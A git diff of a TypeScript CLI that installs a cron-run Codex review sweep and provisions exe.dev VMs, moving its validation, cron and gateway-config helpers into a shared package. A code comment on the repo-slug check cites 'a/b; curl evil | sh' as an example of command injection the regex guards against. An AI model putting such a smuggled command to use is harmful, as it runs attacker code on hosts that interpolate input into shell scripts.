@@ -13,6 +13,20 @@ import { homedir } from 'node:os'
 import { dirname, join, relative, resolve } from 'node:path'
 import { fileURLToPath } from 'node:url'
 import { cancel, confirm, intro, isCancel, log, multiselect, note, outro, spinner, text } from '@clack/prompts'
+import {
+  detectRepo,
+  exe,
+  exeSetupScript,
+  githubIntegrationFor,
+  installCron,
+  llmIntegrationFor,
+  normalizeRepo,
+  stableBun,
+  validHost,
+  validRepo,
+  vmNameFor as packageVmNameFor,
+  writeCodexGatewayConfig,
+} from '@stupify/exe-cli'
 import pc from 'picocolors'
 
 const PKG_DIR = dirname(fileURLToPath(import.meta.url))
@@ -21,6 +35,7 @@ const VERSION = (JSON.parse(readFileSync(join(PKG_ROOT, 'package.json'), 'utf8')
 const HOME = process.env.STUPIFY_HOME ?? join(homedir(), '.stupify')
 const STATE = join(HOME, 'state')
 const REQUIRED = ['bun', 'gh', 'codex', 'git'] as const
+const vmNameFor = (repo: string): string => packageVmNameFor('stupify', repo)
 
 // Taste packs: "code like X". Picking one (or several) seeds the corpus, so you don't start from a blank file.
 interface Pack {
@@ -53,6 +68,22 @@ function die(message: string): never {
   process.exit(1)
 }
 
+async function installSweepEngine(dest = join(HOME, 'review-sweep.ts')): Promise<void> {
+  const built = await Bun.build({
+    entrypoints: [join(PKG_DIR, 'review-sweep.ts')],
+    target: 'bun',
+    format: 'esm',
+  })
+  if (!built.success) {
+    const details = built.logs.map((l) => l.message).join('\n').trim()
+    throw new Error(details || 'could not bundle review-sweep.ts')
+  }
+  const [artifact] = built.outputs
+  if (artifact === undefined) throw new Error('could not bundle review-sweep.ts (no output)')
+  mkdirSync(dirname(dest), { recursive: true })
+  await Bun.write(dest, artifact)
+}
+
 // clack's spinner reads stdin and keeps the event loop alive in non-TTY contexts (CI, pipes, scripts) — the
 // process never exits. Fall back to plain step logs there so non-interactive runs actually finish.
 function progress(start: string): { stop: (msg: string) => void } {
@@ -63,73 +94,6 @@ function progress(start: string): { stop: (msg: string) => void } {
   const s = spinner()
   s.start(start)
   return { stop: (msg: string) => s.stop(msg) }
-}
-
-// A bun path the cron can rely on. Under `bunx`, the running bun lives in an EPHEMERAL /tmp/bun-node-… dir
-// that's deleted after install — so never bake that into the crontab. Prefer a stable install location.
-function stableBun(): string {
-  const running = Bun.which('bun')
-  if (running && !running.includes('/bun-node-') && !running.startsWith('/tmp/')) return running
-  for (const c of [join(homedir(), '.bun/bin/bun'), '/opt/homebrew/bin/bun', '/home/linuxbrew/.linuxbrew/bin/bun', '/usr/local/bin/bun', '/usr/bin/bun']) {
-    if (existsSync(c)) return c
-  }
-  return running ?? 'bun'
-}
-
-function detectRepo(): string | null {
-  const r = spawnSync('git', ['config', '--get', 'remote.origin.url'], { encoding: 'utf8' })
-  if (r.status !== 0) return null
-  const slug = (r.stdout ?? '')
-    .trim()
-    .replace(/^[a-z]+:\/\/[^/]+\//, '')
-    .replace(/^git@[^:]+:/, '')
-    .replace(/\.git$/, '')
-  return validRepo(slug) ? slug : null
-}
-
-// Strict owner/repo — GitHub names are word chars / dot / hyphen only. This is also a security boundary:
-// `repo` is interpolated into a shell setup-script that runs on the VM, so anything looser than this would
-// let `a/b; curl evil | sh` through.
-function validRepo(r: string): boolean {
-  return /^[\w.-]+\/[\w.-]+$/.test(r)
-}
-
-// Reduce the forms people actually paste — @owner/repo, a full github URL, an ssh URL, a trailing .git/slash —
-// to the bare owner/repo. validRepo (the security gate) still runs on the result.
-function normalizeRepo(input: string): string {
-  return input
-    .trim()
-    .replace(/^@/, '')
-    .replace(/^https?:\/\/(www\.)?github\.com\//i, '')
-    .replace(/^git@github\.com:/i, '')
-    .replace(/\.git$/i, '')
-    .replace(/\/+$/, '')
-}
-
-// An exe.dev integration host is interpolated into config.env AND the crontab line (which cron runs via /bin/sh),
-// so gate it like the repo slug — hostname chars only, no spaces/newlines/metacharacters.
-function validHost(h: string): boolean {
-  return /^[\w.-]+$/.test(h)
-}
-
-function installCron(opts: { ghHost: string }): string {
-  const bun = stableBun()
-  const prefix = opts.ghHost ? `GH_HOST=${opts.ghHost} ` : ''
-  // No flock — the sweep self-locks (state/sweep.lock), so overlapping cron ticks no-op on their own.
-  const line = `*/1 * * * * ${prefix}${bun} ${join(HOME, 'review-sweep.ts')} >> ${STATE}/cron.log 2>&1`
-  // crontab is external and can hang in restricted/sandboxed environments — cap both calls so a hung crontab
-  // becomes a clean error (with the line to paste), never an infinite block.
-  const current = spawnSync('crontab', ['-l'], { encoding: 'utf8', timeout: 8_000 }).stdout ?? ''
-  const kept = current
-    .split('\n')
-    .filter((l) => l.trim() && !l.includes('review-sweep.ts'))
-  const next = [...kept, line].join('\n') + '\n'
-  const wrote = spawnSync('crontab', ['-'], { input: next, encoding: 'utf8', timeout: 8_000 })
-  if (wrote.status !== 0) {
-    const why = (wrote.stderr ?? '').trim() || wrote.error?.message || (wrote.signal ? `timed out (${wrote.signal})` : 'crontab exited non-zero')
-    throw new Error(`couldn't install the cron job (${why}). your config is saved. add the line yourself:\n  ${line}`)
-  }
-  return line
 }
 
 // The short human label for a set of picked packs, e.g. "Sindre Sorhus + devshorts" — for plan/success notes.
@@ -370,6 +334,7 @@ async function setup(argv: { repo?: string; host?: string; codexHost?: string; y
     host = answer.trim()
   }
   if (host && !validHost(host)) die(`'${host}' is not a valid host, hostname characters only (e.g. acme.int.exe.xyz)`)
+  if (argv.codexHost && !validHost(argv.codexHost)) die(`'${argv.codexHost}' is not a valid Codex gateway host, hostname characters only`)
 
   // 3.5 taste — pick a pack (or your own code)
   const packs = await pickPacks({ yes: argv.yes, packArg: argv.pack })
@@ -402,15 +367,15 @@ async function setup(argv: { repo?: string; host?: string; codexHost?: string; y
   // 5. install
   const s2 = progress('installing')
   mkdirSync(STATE, { recursive: true })
-  copyFileSync(join(PKG_DIR, 'review-sweep.ts'), join(HOME, 'review-sweep.ts'))
+  await installSweepEngine()
   assembleReview(packs)
   const cfg = [`REPO_SLUG=${repo}`, host ? `GH_HOST=${host}` : '', '# tune anything else here, see the README']
     .filter(Boolean)
     .join('\n')
   writeFileSync(join(HOME, 'config.env'), cfg + '\n')
-  if (host) writeCodexGatewayConfig(argv.codexHost) // exe.dev VM: route Codex through the no-key exe-llm gateway
+  if (host) writeCodexGatewayConfig({ home: HOME, gatewayHost: argv.codexHost }) // exe.dev VM: route Codex through the no-key exe-llm gateway
   try {
-    installCron({ ghHost: host })
+    installCron({ stateDir: STATE, engineFile: join(HOME, 'review-sweep.ts'), ghHost: host, removeMarker: 'review-sweep.ts' })
   } catch (e) {
     s2.stop(pc.yellow('files installed, but the cron job failed'))
     die((e as Error).message) // friendly: includes the reason + the exact line to add by hand
@@ -648,67 +613,6 @@ function cmdReview(ref: string | undefined, post: boolean): void {
 
 // --- provision: spin up an exe.dev VM that runs stupify, from your laptop ---
 
-function exe(args: string[], input = ''): { ok: boolean; out: string } {
-  const r = spawnSync('ssh', ['-o', 'ConnectTimeout=25', 'exe.dev', ...args], {
-    input,
-    encoding: 'utf8',
-    maxBuffer: 8 * 1024 * 1024,
-    timeout: 180_000, // ConnectTimeout only caps the handshake; cap the whole call so a stalled VM op can't hang the CLI
-  })
-  return { ok: r.status === 0, out: (r.stdout ?? '') + (r.stderr ?? '') }
-}
-
-function githubIntegrationFor(repo: string): string | null {
-  const r = exe(['int', 'list', '--json'])
-  if (!r.ok) return null
-  try {
-    const list: { name: string; type: string; config?: { repositories?: string[] } }[] = JSON.parse(r.out)
-    return list.find((i) => i.type === 'github' && (i.config?.repositories ?? []).includes(repo))?.name ?? null
-  } catch {
-    return null
-  }
-}
-
-const vmNameFor = (repo: string): string => 'stupify-' + repo.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '')
-
-/** Find the exe.dev `llm` integration that fronts Codex (the no-key gateway at `<name>.int.exe.xyz/v1`). It's
- *  auto-installed for most exe.dev users; we need one whose openai provider is configured (that's what `codex
- *  exec` talks to). Returns its name, or null — without it every review 401s on api.openai.com. */
-function llmIntegrationFor(): string | null {
-  const r = exe(['int', 'list', '--json'])
-  if (!r.ok) return null
-  try {
-    const list: { name: string; type: string; config?: { providers?: { openai?: { enabled?: boolean } } } }[] = JSON.parse(r.out)
-    return list.find((i) => i.type === 'llm' && i.config?.providers?.openai?.enabled)?.name ?? null
-  } catch {
-    return null
-  }
-}
-
-/** Point Codex at the exe.dev exe-llm gateway — no keys, the integration fronts your ChatGPT/Codex plan. ONLY on
- *  the exe.dev VM path (a local `stupify setup` leaves your own `codex login` alone). Idempotent: never clobbers an
- *  existing `model_provider` (codex writes its own project-trust entries into this file between runs). */
-function writeCodexGatewayConfig(gatewayHost = 'llm.int.exe.xyz'): void {
-  const dir = process.env.CODEX_HOME ?? join(homedir(), '.codex')
-  const file = join(dir, 'config.toml')
-  const existing = existsSync(file) ? readFileSync(file, 'utf8') : ''
-  if (existing.includes('model_provider')) return // already wired (re-provision) — don't fight codex's own edits
-  mkdirSync(dir, { recursive: true })
-  // Top-level keys must precede any [table], so this block leads. The repo trust entry lets `codex exec` run
-  // unattended in the checkout without a trust prompt.
-  const block = `model_provider = "exe-llm"
-
-[model_providers.exe-llm]
-name = "exe-llm"
-base_url = "https://${gatewayHost}/v1"
-requires_openai_auth = false
-
-[projects."${join(HOME, 'repo')}"]
-trust_level = "trusted"
-`
-  writeFileSync(file, existing ? `${block}\n${existing}` : block)
-}
-
 async function provision(argv: { repo?: string; yes: boolean; pack?: string }): Promise<void> {
   console.clear()
   intro(pc.bgMagenta(pc.black(' stupify ')) + pc.dim(' · provision a reviewer on exe.dev'))
@@ -805,12 +709,8 @@ async function provision(argv: { repo?: string; yes: boolean; pack?: string }): 
   // 5. create the VM with a first-boot setup-script that installs stupify
   const s3 = progress('provisioning VM + installing stupify')
   const vm = vmNameFor(repo)
-  const script = [
-    'export PATH="$HOME/.bun/bin:/usr/local/bin:$PATH"',
-    'command -v bun >/dev/null 2>&1 || curl -fsSL https://bun.sh/install | bash',
-    'export PATH="$HOME/.bun/bin:$PATH"',
-    `exec bunx @stupify/cli@${VERSION} setup ${repo} --host ${host}${llm ? ` --codex-host ${llm}.int.exe.xyz` : ''} --pack ${packs.join(',') || 'own'} --yes`,
-  ].join('\n')
+  const setupCommand = `exec bunx @stupify/cli@${VERSION} setup ${repo} --host ${host} --pack ${packs.join(',') || 'own'} --yes`
+  const script = exeSetupScript(setupCommand, llm ? `${llm}.int.exe.xyz` : undefined)
   const created = exe(['new', '--name', vm, '--integration', integration, '--json', '--setup-script', '/dev/stdin'], script)
   if (!created.ok) {
     s3.stop(pc.red('provision failed'))
@@ -894,7 +794,7 @@ ${pc.dim("Provisioning rides exe.dev. Onboard once with 'ssh exe.dev', then one 
 }
 
 // `stupify upgrade [repo]` — move a box to the latest published engine, IN PLACE. Narrow on purpose: it only
-// re-copies the engine (review-sweep.ts, plus prime.ts where the hook is installed). It never rewrites config.env
+// re-bundles the engine (review-sweep.ts, plus prime.ts where the hook is installed). It never rewrites config.env
 // (your tuning), the assembled .review/ taste, or the cron line. The minute cron runs the new file on its next
 // tick, so nothing restarts. The engine is otherwise PINNED at provision time — this is the supported way forward.
 //   no repo → upgrade THIS machine (run it on the VM itself, or a local `stupify setup` box) from this package.
@@ -921,7 +821,7 @@ async function upgrade(repoArg?: string): Promise<void> {
   if (!existsSync(join(HOME, 'review-sweep.ts'))) {
     die(`nothing installed at ${HOME} to upgrade — run ${pc.cyan('stupify setup')} (this machine) or ${pc.cyan('stupify <owner/repo>')} (a VM) first`)
   }
-  copyFileSync(join(PKG_DIR, 'review-sweep.ts'), join(HOME, 'review-sweep.ts'))
+  await installSweepEngine()
   if (existsSync(PRIME_ENGINE)) copyFileSync(join(PKG_DIR, 'prime.ts'), PRIME_ENGINE) // only where `prime --install` put it
   log.success(`engine refreshed to ${VERSION} → ${HOME} ${pc.dim('· cron runs it within ~60s')}`)
 }
